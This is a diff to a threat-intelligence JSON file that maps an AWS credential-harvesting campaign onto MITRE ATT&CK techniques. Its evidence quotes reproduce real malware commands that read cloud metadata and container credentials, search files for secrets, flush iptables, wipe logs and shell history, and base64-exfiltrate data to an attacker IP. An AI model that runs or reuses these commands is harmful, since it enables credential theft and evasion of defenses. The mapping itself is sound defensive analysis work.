@@ -59,21 +59,21 @@
       "techniques": [
         {
           "technique_id": "T1552.005",
-          "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
+          "technique_name": "Cloud Instance Metadata API",
           "inferred": false,
           "evidence_quote": "AWS_INFO=$(dload http://169.254.169.254/latest/meta-data/iam/info | tr '\\0' '\\n')\nAWS_1_EC2=$(dload http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | tr '\\0' '\\n')",
           "validated": true
         },
         {
           "technique_id": "T1552.001",
-          "technique_name": "Unsecured Credentials: Credentials In Files",
+          "technique_name": "Credentials In Files",
           "inferred": false,
           "evidence_quote": "find / -maxdepth 23 -type f -name $CREFILE 2>/dev/null | xargs -I % sh -c 'echo :::%; cat %' >> $EDIS",
           "validated": true
         },
         {
           "technique_id": "T1552.007",
-          "technique_name": "Unsecured Credentials: Container API",
+          "technique_name": "Container API",
           "inferred": false,
           "evidence_quote": "dload http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | sed 's/,/\\n/g' | grep 'AccessKeyId\\|SecretAccessKey\\|Token\\|Expiration'",
           "validated": true
@@ -108,19 +108,6 @@
       ]
     },
     {
-      "tactic_id": "TA0010",
-      "tactic_name": "Exfiltration",
-      "techniques": [
-        {
-          "technique_id": "T1041",
-          "technique_name": "Exfiltration Over C2 Channel",
-          "inferred": false,
-          "evidence_quote": "SEND_B64_DATA=$(cat $CSOF | base64 -w 0)\nrm -f $CSOF\ndload http://45.9.148.221/in/in.php?base64=$SEND_B64_DATA > /dev/null",
-          "validated": false
-        }
-      ]
-    },
-    {
       "tactic_id": "TA0011",
       "tactic_name": "Command and Control",
       "techniques": [
@@ -129,6 +116,19 @@
           "technique_name": "Application Layer Protocol: Web Protocols",
           "inferred": false,
           "evidence_quote": "harvested credentials are uploaded to an open HTTP directory http://45.9.148.221/<redacted>/",
+          "validated": false
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0010",
+      "tactic_name": "Exfiltration",
+      "techniques": [
+        {
+          "technique_id": "T1041",
+          "technique_name": "Exfiltration Over C2 Channel",
+          "inferred": false,
+          "evidence_quote": "SEND_B64_DATA=$(cat $CSOF | base64 -w 0)\nrm -f $CSOF\ndload http://45.9.148.221/in/in.php?base64=$SEND_B64_DATA > /dev/null",
           "validated": false
         }
       ]
@@ -324,7 +324,7 @@
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Unix Shell",
         "description": "Attacker downloaded and executed aws.sh, a Bash credential harvesting script, on compromised systems.",
-        "tactic_id": "",
+        "tactic_id": "TA0002",
         "evidence_quote": "The file aws.sh was uploaded and made accessible at the path: http://45.9.148.221/sh/get/aws.sh. aws.sh is a utility that is meant to harvest credentials from AWS EC2 instances",
         "evidence_sources": [
           "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
@@ -338,7 +338,7 @@
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "description": "The script flushed all iptables rules and set default policies to ACCEPT, disabling host-based firewall protections.",
-        "tactic_id": "",
+        "tactic_id": "TA0005",
         "evidence_quote": "iptables -P INPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -P FORWARD ACCEPT 2>/dev/null 1>/dev/null\niptables -P OUTPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -F 2>/dev/null 1>/dev/null",
         "evidence_sources": [
           "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
@@ -424,7 +424,7 @@
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal: Clear Linux or Mac System Logs",
         "description": "The script cleared syslog, auth.log, wtmp, btmp, lastlog, and ran lastlog --clear to remove forensic evidence of the intrusion.",
-        "tactic_id": "",
+        "tactic_id": "TA0005",
         "evidence_quote": "rm -f /var/log/syslog.* 2>/dev/null 1>/dev/null\nrm -f /var/log/auth.log.* 2>/dev/null 1>/dev/null\nlastlog --clear --user root 2>/dev/null 1>/dev/null",
         "evidence_sources": [
           "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
@@ -438,7 +438,7 @@
         "technique_id": "T1070.003",
         "technique_name": "Indicator Removal: Clear Command History",
         "description": "The script deleted and immutably locked bash_history and cleared in-memory command history to prevent forensic recovery.",
-        "tactic_id": "",
+        "tactic_id": "TA0005",
         "evidence_quote": "rm -f ~/.bash_history 2>/dev/null 1>/dev/null\ntouch ~/.bash_history 2>/dev/null 1>/dev/null\nchattr +i ~/.bash_history 2>/dev/null 1>/dev/null\nhistory -cw",
         "evidence_sources": [
           "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
@@ -452,7 +452,7 @@
         "technique_id": "T1041",
         "technique_name": "Exfiltration Over C2 Channel",
         "description": "Harvested credentials were base64-encoded and exfiltrated to the attacker's C2 server via an HTTP GET request to a PHP ingestion endpoint.",
-        "tactic_id": "",
+        "tactic_id": "TA0010",
         "evidence_quote": "SEND_B64_DATA=$(cat $CSOF | base64 -w 0)\nrm -f $CSOF\ndload http://45.9.148.221/in/in.php?base64=$SEND_B64_DATA > /dev/null",
         "evidence_sources": [
           "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
